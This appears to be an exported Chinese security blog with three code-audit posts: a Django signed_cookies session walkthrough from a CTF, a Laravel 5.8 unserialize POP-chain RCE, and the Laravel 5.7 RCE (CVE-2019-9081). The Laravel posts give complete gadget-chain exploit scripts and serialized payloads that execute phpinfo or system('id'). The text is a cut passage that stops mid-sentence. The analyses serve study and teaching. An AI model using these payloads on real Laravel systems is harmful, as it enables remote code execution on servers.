    <content type="text"><![CDATA[先知原帖 : https://xz.aliyun.com/t/6265 最近做了 ph 牛的 code-breaking，在做 picklecode 这一题时，没有搞懂那个 django 的 signed_cookies 引擎对 session 的操作，就 debug 了一下，做个总结，算是做了个代码审计吧 0x01 获取 session_auth_hash 题目 : https://github.com/phith0n/code-breaking/tree/master/2018/picklecode django 使用的 SESSION_ENGINE 为 django.contrib.sessions.backends.signed_cookies pycharm 开启 debug 模式，username 为 peri0d，password 为 123456 入口文件在 views.py，第 34 行新建了用户并对密码进行了加密。第 35 行调用 auth_login() 函数，跳转到 auth\__init__.py 的 login() 方法 第 97 行，调用 user 类的 get_session_auth_hash() 方法来获取 session_auth_hash 的值，跟进 get_session_auth_hash() 给 key_salt 赋值后调用 salted_hmac(key_salt, self.password) 生成 session_auth_hash，这里的 password 是经过加密的，跟进 salted_hmac() 在第 39 行对 key_salt + secret 进行 sha1 加密并以 byte 类型返回给 key。这里的 value 是经过加密后的 password。然后调用 hmac.new()返回一个 sha1 模式的 hmac 对象 流程梳理 123456key_salt = '***'# SECRET_KEYsecret = '******'key = hashlib.sha1(key_salt + secret).digest()sha1_obj = hmac.new(key, msg=password_enc, digestmod=hashlib.sha1)session_auth_hash = sha1_obj.hexdigest() 0x02 初始化 sessionid 获取 session_auth_hash 后，单步调试，进入 base.py 执行 __contains__() 函数，参数为 _auth_user_id 单步调试，然后执行 _get_session() 函数，返回缓存 session，是一个空字典 在第 108 行执行 cycle_key()，使用新密钥保存相同的数据，调用 save()，它在请求结束时自动保存一个带有新密钥的 cookie 。 跟进 save()，在第 41 行执行 _get_session_key() ，生成一个 base64 编码后的字符串作为 session key，继续跟进，它又调用了 signing.dumps() 然后单步调试进入到 _get_session() 方法获取 self._session，从缓存中加载 session，此时为一个空字典，即 self._session == {} 然后分别给 compress，salt，serializer 赋值，然后调用 signing.dumps() ，继续跟进，传入的参数 obj = {}, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39;, compress = True 在 signing.dumps() 中对序列化之后的数据进行压缩，然后进行 base64 编码，再 decode() 为一个 Unicode 的 base64d，其值为 &#39;gAN9cQAu&#39; ，最后调用 TimestampSigner 类的 sign() 方法，继续跟进 TimestampSigner 类继承自 Signer 类，先调用它的 __init__ 方法进行初始化，key = &#39;zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm&#39;, sep = &#39;:&#39;, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39; 然后调用 TimestampSigner 类的 sign() 方法，根据 value=&#39;gAN9cQAu&#39;，sep 和 timestamp() 对 value 进行重新赋值，其值为 &#39;gAN9cQAu:1i5q6e&#39; ，然后再次在 Signer.sign() 中重新赋值，得到最后结果 &#39;gAN9cQAu:1i5q6e:wjJR2MUONx_wmPA3m8zYqTj5uCQ 回到 save() ，继续单步调试，调用了 base.py 中第 170 行的 _set_session_key() 方法，将 value 赋值给 session_key 和 _session_key 回到 save() ，完成赋值，回到 cycle_key()，再回到 auth\__init__.py 的 login() 方法的第 108 行，这时可以在变量列表看到设置的 session 信息了 后面的代码是 django 对用户的持久化处理以及对 CSRF token 的验证等等，值得注意的是在第 126 行到 128 行，进行了 session 设置 流程梳理 12345678910_session = &#123;&#125;# SECRET_KEYsecret = '******'salt='****'data = serializer().dumps(_session)compressed = zlib.compress(data)base64d = b64_encode(data).decode()session_key = TimestampSigner(SECRET_KEY, salt=salt).sign(base64d) 0x03 response 写入 session 然后看它如何在 response 中设置 cookie 的，继续调试，在 contrib\sessions\middleware.py 中发现其对 cookie 的操作，从 44 行开始是设置 cookie 的存活时间，在第 58 行看到了 save() 函数，进行 cookie 的保存，单步调试进入 在 save() 函数中，调用 _get_session_key() 函数，剩下的反序列化和前面的相同，只是 session 的值发生了改变，从空字典变为含有 3 个元素的字典，然后就是将 cookie 设置在返回包中，这就完成了 cookie 设置的分析 0x04 总结 总结一下，它对 session 处理的核心机制在于 django.core.signing.dumps() 函数，其具体代码如下，可以看到，data 为 pickle 序列化之后的 byte 对象，我们只要将 data 改为构造好的 evil pickle code 即能实现任意的代码执行 123456789101112131415def dumps(obj, key=None, salt='django.core.signing', serializer=JSONSerializer, compress=False): data = serializer().dumps(obj) is_compressed = False if compress: compressed = zlib.compress(data) if len(compressed) &lt; (len(data) - 1): data = compressed is_compressed = True base64d = b64_encode(data).decode() if is_compressed: base64d = '.' + base64d return TimestampSigner(key, salt=salt).sign(base64d)]]></content>
      <categories>
        <category>code-breaking</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>code-breaking</tag>
        <tag>Django signed_cookies</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel 5.8 RCE 分析]]></title>
    <url>%2F2019%2F08%2F14%2FLaravel%205.8%20RCE%2F</url>
    <content type="text"><![CDATA[先知社区地址 : https://xz.aliyun.com/t/6059 Laravel 代码审计 环境搭建 composer create-project --prefer-dist laravel/laravel laravel58 安装 Laravel 5.8 并生成 laravel58 项目 进入项目文件夹，使用 php artisan serve 启动 web 服务 在 laravel58/routes/web.php 文件添加路由 1Route::get("/","\App\Http\Controllers\DemoController@demo"); 在 laravel58/app/Http/Controllers/ 下添加 DemoController.php 控制器 1234567891011121314151617&lt;?phpnamespace App\Http\Controllers;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return "Welcome to laravel5.8"; &#125;&#125; 漏洞分析 ph 牛的 payload : https://github.com/ambionics/phpggc/pull/61 从 Illuminate\Broadcasting\PendingBroadcast 类的 __destruct 方法开始的 pop 链 Illuminate\Broadcasting\PendingBroadcast 中，$events 必须实现 Dispatcher 接口，这里选择的是 Illuminate\Bus\Dispatcher 12345678910public function __construct(Dispatcher $events, $event)&#123; $this-&gt;event = $event; $this-&gt;events = $events;&#125;public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; Illuminate\Bus\Dispatcher 中，调用 dispatch 方法，进入 if 判断，$this-&gt;queueResolver 是在实例化 Illuminate\Bus\Dispatcher 时的一个参数，它必须有值，$command 也就是 $this-&gt;event 必须实现 ShouldQueue 接口，这里选择的就是 Illuminate\Broadcasting\BroadcastEvent 123456789101112131415161718192021// $command : $this-&gt;eventpublic function dispatch($command)&#123; if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command);&#125;public function __construct(Container $container, Closure $queueResolver = null)&#123; $this-&gt;container = $container; $this-&gt;queueResolver = $queueResolver; $this-&gt;pipeline = new Pipeline($container);&#125;protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125; 到这里，构造出的 exp : 12345678910111213&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125;&#125;?&gt; 然后进入 dispatchToQueue 方法，存在 call_user_func 方法，其中的 $this-&gt;queueResolver 是可控的，这里利用的是 Mockery\Loader\EvalLoader 的 load 方法，即 $this-&gt;queueResolver 为 array(new Mockery\Loader\EvalLoader(), &quot;load&quot;) 12345678910111213141516public function dispatchToQueue($command)&#123; $connection = $command-&gt;connection ?? null; $queue = call_user_func($this-&gt;queueResolver, $connection); if (! $queue instanceof Queue) &#123; throw new RuntimeException('Queue resolver did not return a Queue implementation.'); &#125; if (method_exists($command, 'queue')) &#123; return $command-&gt;queue($queue, $command); &#125; return $this-&gt;pushCommandToQueue($queue, $command);&#125; 这个点的意思就是 $this-&gt;events 调用 dispatch 传入参数 $this-&gt;event 后 访问 $this-&gt;events 的 queueResolver 属性 调用 $this-&gt;events-&gt;commandShouldBeQueued($this-&gt;event) 方法 调用 dispatchToQueue 传入 $this-&gt;event 参数。其中的 $connection 为 $this-&gt;event-&gt;connection ，即 Illuminate\Broadcasting\BroadcastEvent 中的 $connection 属性 call_user_func 将 $connection 作为参数传给 $this-&gt;queueResolver 返回的函数 到这里，构造出的 exp 如下，已经实现 call_user_func($this-&gt;queueResolver, $connection) 即 call_user_func($evilFunc, $evilCode) ，接下来就要寻找一个可以利用的函数，这里选择的是 Mockery\Loader\EvalLoader ，继续跟进 123456789101112131415161718192021222324252627282930&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = $evilCode; &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = $evilFunc; &#125; &#125;&#125; Mockery\Loader\EvalLoader 中有一个 eval 函数可以利用，这里的 $definition 是 MockDefinition 类的实例化对象，也就说明 $this-&gt;event-&gt;connection 是 MockDefinition 类的实例化对象。接下来就是绕过 if 判断。 1234567891011class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123; return; &#125; eval("?&gt;" . $definition-&gt;getCode()); &#125;&#125; 跟进 Mockery\Generator\MockDefinition ，如果要绕过 if 判断，必须让 getClassName 返回一个不存在的类名，即 $this-&gt;config-&gt;getName() 返回一个不存在的类名。$config 为 Mockery\Generator\MockConfiguration 的实例化对象 1234567891011121314151617181920212223242526272829class MockDefinition&#123; protected $config; protected $code; public function __construct(MockConfiguration $config, $code) &#123; if (!$config-&gt;getName()) &#123; throw new \InvalidArgumentException("MockConfiguration must contain a name"); &#125; $this-&gt;config = $config; $this-&gt;code = $code; &#125; public function getConfig() &#123; return $this-&gt;config; &#125; public function getClassName() &#123; return $this-&gt;config-&gt;getName(); &#125; public function getCode() &#123; return $this-&gt;code; &#125;&#125; Mockery\Generator\MockConfiguration 中，让 getName() 返回一个不存在的类名，最终执行 eval(&quot;?&gt;&quot; . $definition-&gt;getCode()); 实现 RCE 123456789class MockConfiguration&#123; protected $name; public function getName() &#123; return $this-&gt;name; &#125;&#125; 最终的 exp ，(ph 牛的 exp ) : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode); &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), 'load']; &#125; &#125;&#125;namespace Mockery\Loader &#123; class EvalLoader &#123;&#125;&#125;namespace Mockery\Generator &#123; class MockDefinition &#123; protected $config; protected $code; function __construct($evilCode) &#123; $this-&gt;code = $evilCode; $this-&gt;config = new MockConfiguration(); &#125; &#125; class MockConfiguration &#123; protected $name = 'abcdefg'; &#125;&#125;namespace &#123; $code = "&lt;?php phpinfo(); exit; ?&gt;"; $exp = new \Illuminate\Broadcasting\PendingBroadcast($code); echo serialize($exp);&#125;?&gt; 构造输出结果 : 1O:40:"Illuminate\Broadcasting\PendingBroadcast":2:&#123;S:9:"\00*\00events";O:25:"Illuminate\Bus\Dispatcher":1:&#123;S:16:"\00*\00queueResolver";a:2:&#123;i:0;O:25:"Mockery\Loader\EvalLoader":0:&#123;&#125;i:1;S:4:"load";&#125;&#125;S:8:"\00*\00event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:&#123;S:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:&#123;S:9:"\00*\00config";O:35:"Mockery\Generator\MockConfiguration":1:&#123;S:7:"\00*\00name";S:7:"abcdefg";&#125;S:7:"\00*\00code";S:25:"&lt;?php phpinfo(); exit; ?&gt;";&#125;&#125;&#125; 一些思考 危险函数的寻找 eval，call_user_func phpstorm + xdebug 调试代码 PHP 序列化的时候 private 和 protected 变量会引入不可见字符 \x00，\00Test\00y 为 private，\00*\00 为 protected，注意这两个 \x00 就是 ascii 码为 0 的字符。这个字符显示和输出可能看不到，甚至导致截断，url 编码后就可以看得很清楚了。此时，为了更加方便进行反序列化 payload 的传输与显示，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示。 1234567891011121314&lt;?phpclass Test&#123; public $x="peri0d"; private $y="peri0d"; protected $z="peri0d";&#125;$k = new Test();echo serialize($k);// O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;?&gt; 反序列化测试代码 : 12345678910111213141516171819202122&lt;?php// 环境 : php 7.1.13 ntsclass Test&#123; public $x="peri0d"; private $y="peri0d"; protected $z="peri0d";&#125;$n = new Test();var_dump(serialize($n));var_dump(unserialize(serialize($n))); // 成功$k = 'O:4:"Test":3:&#123;S:1:"x";S:6:"peri0d";S:7:"\00Test\00y";S:6:"peri0d";S:4:"\00*\00z";S:6:"peri0d";&#125;';var_dump(unserialize($k)); // 成功$m = 'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"\00Test\00y";s:6:"peri0d";s:4:"\00*\00z";s:6:"peri0d";&#125;';var_dump(unserialize($m)); // 失败$l = 'O:4:"Test":3:&#123;s:1:"x";s:6:"peri0d";s:7:"Testy";s:6:"peri0d";s:4:"*z";s:6:"peri0d";&#125;';var_dump(unserialize($l)); // 失败?&gt; 参考链接 https://xz.aliyun.com/t/5911 https://xz.aliyun.com/t/5866]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>Laravel</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel 5.7 RCE (CVE-2019-9081)]]></title>
    <url>%2F2019%2F08%2F10%2FLaravel%205.7%20RCE%2F</url>
    <content type="text"><![CDATA[Laravel 5.7 RCE代码审计 环境搭建 Laravel 5.7 文档 : https://learnku.com/docs/laravel/5.7/installation/2242 Composer 下载 : wget https://getcomposer.org/download/1.8.6/composer.phar 获取 composer.phar 参照 https://www.jianshu.com/p/438a95046403 安装 Composer 和 Laravel composer create-project laravel/laravel laravel57 &quot;5.7.*&quot; 安装 Laravel 5.7 并生成 laravel57 项目 进入项目文件夹，使用 php artisan serve 启动 web 服务 在 laravel57/routes/web.php 文件添加路由 1Route::get("/","\App\Http\Controllers\DemoController@demo"); 在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器 1234567891011121314namespace App\Http\Controllers;class DemoController&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); return "peri0d"; &#125; &#125;&#125; Laravel 项目文件夹结构 app : 包含了应用的核心代码 Broadcasting : 包含应用程序的所有广播频道类，默认不存在 Console : 包含了所有自定义的 Artisan 命令 Events : 存放了 事件类。可以使用事件来提醒应用其他部分发生了特定的操作，使应用程序更加的灵活和解耦。默认不存在 Exceptions : 包含了应用的异常处理器，也是应用抛出异常的好地方 Http : 包含了控制器、中间件和表单请求。几乎所有的进入应用的请求的处理逻辑都被放在这里 Jobs : 存放了应用中的 队列任务 。 应用的任务可以被推送到队列或者在当前请求的生命周期内同步运行。在当前请求期间同步运行的任务可以看做是一个「命令」，因为它们是 命令模式 的实现。默认不存在 Listeners : 包含了用来处理 事件 的类。事件监听器接收事件实例并执行响应该事件被触发的逻辑。默认不存在 Mail : 包含应用所有的邮件发送类。默认不存在 Notifications : 包含应用发送的所有「业务性」通知，比如关于在应用中发生的事件的简单通知。默认不存在 Policies : 包含了应用的授权策略类。策略可以用来决定一个用户是否有权限去操作指定资源。默认不存在 Providers : 包含应用的所有服务提供者。服务提供者通过在服务容器中绑定服务、注册事件、以及执行其他任务来为即将到来的请求做准备来启动应用。 Rules : 包含应用自定义验证规则对象。这些规则意在将复杂的验证逻辑封装在一个简单的对象中。默认不存在 bootstrap : 包含启动框架的 app.php ，还包含 cache 目录，其下存放框架生成的用来提升性能的文件，比如路由和服务缓存文件 config : 包含应用程序所有的配置文件 database : 包含数据填充和迁移文件以及模型工厂类 public : 包含入口文件 index.php，它是进入应用程序的所有请求的入口点。还包含一些资源文件，比如图片、JS 和 CSS resources : 包含了视图和未编译的资源文件(如 LESS、SASS 或 JavaScript )。此目录还包含所有的语言文件 routes : 包含了应用的所有路由定义 storage : 包含编译后的 Blade 模板、session 会话生成的文件、缓存文件以及框架生成的其他文件 tests : 包含自动化测试文件 vendor : 包含所有的 Composer 依赖包，其中也包含了 Laravel 源码 第一种漏洞分析 漏洞触发点位于 Illuminate/Foundation/Testing/PendingCommand.php 中的 run 方法，该文件的功能就是命令执行并获取输出，PendingCommand.php 又定义了 __destruct() 方法，思路就是构造 payload 触发 __destruct() 方法进而调用 run 方法实现 rce 根据已有的 exp 来看，PendingCommand 类的属性如下 1234$this-&gt;app; // 一个实例化的类 Illuminate\Foundation\Application$this-&gt;test; // 一个实例化的类 Illuminate\Auth\GenericUser$this-&gt;command; // 要执行的php函数 system$this-&gt;parameters; // 要执行的php函数的参数 array('id') 在 unserialize($code) 处下断点调试，观察调用栈，发现有几个加载函数，spl_autoload_call() 、Illuminate\Foundation\AliasLoader-&gt;load() 、Composer\Autoload\ClassLoader-&gt;loadClass() 、Composer\Autoload\includeFile() 。 在加载完所需要的类后，会进入 PendingCommand 类的 __destruct() 方法。由于 hasExecuted 默认是 false，所以会去执行 run() 函数，run() 函数会在第 8 行执行命令，其代码如下 1234567891011121314public function run()&#123; $this-&gt;hasExecuted = true; $this-&gt;mockConsoleOutput(); try &#123; $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); &#125; catch (NoMatchingExpectationException $e) &#123; if ($e-&gt;getMethodName() === 'askQuestion') &#123; $this-&gt;test-&gt;fail('Unexpected question "'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'" was asked.'); &#125; throw $e;&#125; run() 中首先执行了 mockConsoleOutput() ，该函数主要功能就是模拟控制台输出，此时又会加载一些所需要的类。代码如下 12345678910111213141516171819protected function mockConsoleOutput()&#123; $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [(new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),]); foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123; $mock-&gt;shouldReceive('askQuestion') -&gt;once() -&gt;ordered() -&gt;with(Mockery::on(function ($argument) use ($question) &#123; return $argument-&gt;getQuestion() == $question[0]; &#125;)) -&gt;andReturnUsing(function () use ($question, $i) &#123; unset($this-&gt;test-&gt;expectedQuestions[$i]); return $question[1]; &#125;); &#125; $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123; return $mock; &#125;);&#125; mockConsoleOutput() 中又调用了 createABufferedOutputMock() 。在 createABufferedOutputMock() 函数中，首先调用 mock() 函数，它的作用主要是进行对象模拟。然后进入循环，要遍历 $this-&gt;test 类的 expectedOutput 属性，但是在可以实例化的类中不存在这个属性。当访问一个类中不存在的属性时会触发 __get() ，通过去触发 __get() 方法去进一步构造 pop 链。 12345678910111213141516private function createABufferedOutputMock()&#123; $mock = Mockery::mock(BufferedOutput::class.'[doWrite]') -&gt;shouldAllowMockingProtectedMethods() -&gt;shouldIgnoreMissing(); foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123; $mock-&gt;shouldReceive('doWrite') -&gt;once() -&gt;ordered() -&gt;with($output, Mockery::any()) -&gt;andReturnUsing(function () use ($i) &#123; unset($this-&gt;test-&gt;expectedOutput[$i]); &#125;); &#125; return $mock;&#125; 这里选择 Illuminate\Auth\GenericUser，其 __get() 魔术方法如下 1234public function __get($key)&#123; return $this-&gt;attributes[$key];&#125; 此时 $this-&gt;test 是我们传入的 Illuminate\Auth\GenericUser 的实例化对象，则 $this-&gt;attributes[$key] 通过反序列化是可控的，因此我们可以构造$this-&gt;attributes键名为expectedOutput的数组。这样一来$this-&gt;test-&gt;expectedOutput就会返回$this-&gt;attributes中键名为expectedOutput的数组 回到 mockConsoleOutput() 中，又进行了一次 for 循环，调用了 $this-&gt;test-&gt;expectedQuestions ，循环体与 createABufferedOutputMock() 大致相同，所以可以构造 $this-&gt;attributes键名为expectedQuestions的数组绕过 然后就可以走出 mockConsoleOutput() 方法，进入命令执行的关键点 $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); ，这里 Kernel::class 是个固定值，为 Illuminate\Contracts\Console\Kernel ，这里需要搞清楚 $this-&gt;app[Kernel::class] ，可以得到如下的函数调用顺序 Container.php:1222, Illuminate\Foundation\Application-&gt;offsetGet() 12345// key = Illuminate\Contracts\Console\Kernelpublic function offsetGet($key)&#123; return $this-&gt;make($key);&#125; Application.php:751, Illuminate\Foundation\Application-&gt;make() 123456789// abstract = Illuminate\Contracts\Console\Kernelpublic function make($abstract, array $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); if (isset($this-&gt;deferredServices[$abstract]) &amp;&amp; ! isset($this-&gt;instances[$abstract])) &#123; $this-&gt;loadDeferredProvider($abstract); &#125; return parent::make($abstract, $parameters);&#125; Container.php:609, Illuminate\Foundation\Application-&gt;make() 12345// abstract = Illuminate\Contracts\Console\Kernelpublic function make($abstract, array $parameters = [])&#123; return $this-&gt;resolve($abstract, $parameters);&#125; Container.php:652, Illuminate\Foundation\Application-&gt;resolve() 123456789101112131415161718192021222324252627// abstract = Illuminate\Contracts\Console\Kernelprotected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null($this-&gt;getContextualConcrete($abstract)); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; return $this-&gt;instances[$abstract]; &#125; $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); // concrete = Illuminate\Foundation\Application if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete); &#125; else &#123; $object = $this-&gt;make($concrete); &#125; foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object;&#125; Container.php:697, Illuminate\Foundation\Application-&gt;getConcrete() 1234567891011// abstract = Illuminate\Contracts\Console\Kernelprotected function getConcrete($abstract)&#123; if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123; return $concrete; &#125; if (isset($this-&gt;bindings[$abstract])) &#123; return $this-&gt;bindings[$abstract]['concrete']; &#125; return $abstract;&#125; 在getConcrete（）方法中出了问题，导致可以利用 php 的反射机制实例化任意类。在 getConcrete() 方法中，判断 $this-&gt;bindings[$abstract]) 是否存在，若存在则返回 $this-&gt;bindings[$abstract][&#39;concrete&#39;] 。bindings 是 Container.php 中 Container 类的属性，因此我们只需要找到一个继承自 Container 的类，就可以通过反序列化控制 $this-&gt;bindings 属性。Illuminate\Foundation\Application 继承自 Container 类。$abstract 为Illuminate\Contracts\Console\Kernel ，只需通过反序列化定义 Illuminate\Foundation\Application 的 $bindings 属性存在键名为 Illuminate\Contracts\Console\Kernel 的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是 Illuminate\Foundation\Application 类。 在实例化 Application类 的时候， 要满足 isBuildable() 才可以进行 build 1234protected function isBuildable($concrete, $abstract)&#123; return $concrete === $abstract || $concrete instanceof Closure;&#125; 此时明显不满足条件，所以接着执行 $object = $this-&gt;make($concrete); ，在 make() 函数中成功将 $abstract 重新赋值为 Illuminate\Foundation\Application，从而成功绕过 isBuildable() 函数，进入 $this-&gt;build 方法，就能看到使用ReflectionClass反射机制，实例化我们传入的类。 在返回一个 Illuminate\Foundation\Application 对象之后，exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); 又调用了 call() 方法，由于 Illuminate\Foundation\Application 没有 call() 方法，所以会调用父类 Illuminate\Container\Container 的 call() 方法。 1234public function call($callback, array $parameters = [], $defaultMethod = null)&#123; return BoundMethod::call($this, $callback, $parameters, $defaultMethod);&#125; 跟进 BoundMethod::call() 1234567891011public static function call($container, $callback, array $parameters = [], $defaultMethod = null)&#123; if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123; return static::callClass($container, $callback, $parameters, $defaultMethod); &#125; return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123; return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); &#125;);&#125; 在 isCallableWithAtSign() 处判断回调函数是否为字符串并且其中含有 @ ，并且 $defaultMethod 默认为 null，很明显不满足条件，进入 callBoundMethod() ，该函数只是判断 $callback 是否为数组。后面的匿名函数直接调用 call_user_func_array() ，并且第一个参数我们可控，参数值为 system ，第二个参数由 getMethodDependencies() 方法返回。跟进 getMethodDependencies() 12345678protected static function getMethodDependencies($container, $callback, array $parameters = [])&#123; $dependencies = []; foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123; static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies); &#125; return array_merge($dependencies, $parameters);&#125; getCallReflector() 用于反射获取 $callback 的对象， 然后执行 addDependencyForCallParameter() 为 $callback 的对象添加一些参数，最后将我们传入的 $parameters 数组和 $dependencies 数组合并， $dependencies 数组为空。最后相当于执行了 call_user_func_array(&#39;system&#39;,array(&#39;id&#39;)) exp 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// gadgets.phpnamespace Illuminate\Foundation\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app) &#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Illuminate\Auth&#123; class GenericUser&#123; protected $attributes; public function __construct(array $attributes)&#123; $this-&gt;attributes = $attributes; &#125; &#125;&#125;namespace Illuminate\Foundation&#123; class Application&#123; protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind)&#123; $this-&gt;bindings=$bind; &#125; &#125;&#125;?&gt; 123456789101112131415161718192021222324&lt;?php// chain.php$genericuser = new Illuminate\Auth\GenericUser( array( "expectedOutput"=&gt;array("0"=&gt;"1"), "expectedQuestions"=&gt;array("0"=&gt;"1") ));$application = new Illuminate\Foundation\Application( array( "Illuminate\Contracts\Console\Kernel"=&gt; array( "concrete"=&gt;"Illuminate\Foundation\Application" ) ));$exp = new Illuminate\Foundation\Testing\PendingCommand( "system",array('id'), $genericuser, $application);echo urlencode(serialize($exp));?&gt; 调用栈分析 : 12345678910111213141516171819202122232425262728293031323334353637383940414243Illuminate\Foundation\Testing\PendingCommand-&gt;__destruct() $test = Illuminate\Auth\GenericUser attributes = array( "expectedOutput"=&gt;array("0"=&gt;"1"), "expectedQuestions"=&gt;array("0"=&gt;"1") ) $app = Illuminate\Foundation\Application array( "Illuminate\Contracts\Console\Kernel" =&gt; array( array("concrete"=&gt;"Illuminate\Foundation\Application") ) ) $command = "system" $parameters = array("id")Illuminate\Foundation\Testing\PendingCommand-&gt;run() Illuminate\Foundation\Testing\PendingCommand-&gt;mockConsoleOutput() Illuminate\Foundation\Testing\PendingCommand-&gt;createABufferedOutputMock() // 在 foreach 中访问 expectedOutput 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法 Illuminate\Auth\GenericUser-&gt;__get() // return attributes["expectedOutput"] // return array("0"=&gt;"1") // 在 foreach 中访问 expectedQuestions 属性，但是 GenericUser 类没有这个属性，故而调用 __get() 方法 Illuminate\Auth\GenericUser-&gt;__get() // return attributes["expectedQuestions"] // return array("0"=&gt;"1")// Application 继承了 Container 所以这相当于执行父类的 offsetGet()Illuminate\Foundation\Application-&gt;offsetGet() // key : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;make() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;make() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;resolve() // abstract : Illuminate\Contracts\Console\Kernel Illuminate\Foundation\Application-&gt;getConcrete() // $this-&gt;bindings[$abstract]['concrete'] : Illuminate\Foundation\Application Illuminate\Foundation\Application-&gt;call() Illuminate\Container\BoundMethod-&gt;call() Illuminate\Container\BoundMethod-&gt;getMethodDependencies() 第二种漏洞分析 同样的，在 PendingCommand 类的 mockConsoleOutput() 函数处，去触发 __get() 方法构造 pop 链，这里选择 Faker\DefaultGenerator 类，其 __get() 方法如下 : 1234public function __construct($default = null)&#123; $this-&gt;default = $default;&#125; 同样的方法绕过 mockConsoleOutput() 函数，运行到 $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); 处。只不过这次的关注点在于 resolve() 函数的 $this-&gt;instances[$abstract] 处 123456789101112131415161718192021222324252627// abstract = Illuminate\Contracts\Console\Kernelprotected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null($this-&gt;getContextualConcrete($abstract)); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; // 在这里返回一个可控的实例化对象 return 